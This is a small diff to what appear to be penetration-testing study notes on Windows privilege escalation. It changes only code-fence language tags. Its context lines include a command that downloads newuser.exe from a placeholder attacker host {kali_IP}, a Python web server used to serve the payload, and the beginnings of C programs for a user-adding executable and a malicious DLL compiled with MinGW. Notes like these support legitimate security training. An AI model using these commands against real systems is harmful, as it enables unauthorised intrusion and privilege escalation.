@@ -170,7 +170,7 @@ C:\Program Files\Windows PowerShell\*
 		- `python3 -m http.server`
 		- `iwr -uri http://{kali_IP}:8000/newuser.exe -Outfile newuser.exe`
 		
-```C
+```cpp
 #include <stdlib.h>
 int main ()
 {
@@ -204,7 +204,7 @@ int main ()
 	- MinGW can compile C++ code into DLLs with the `--shared` flag
 		- `x86_64-w64-mingw32-gcc dll.cpp --shared -o dll.dll`
 
-```C
+```cpp
 #include <stdlib.h>
 #include <windows.h>
 
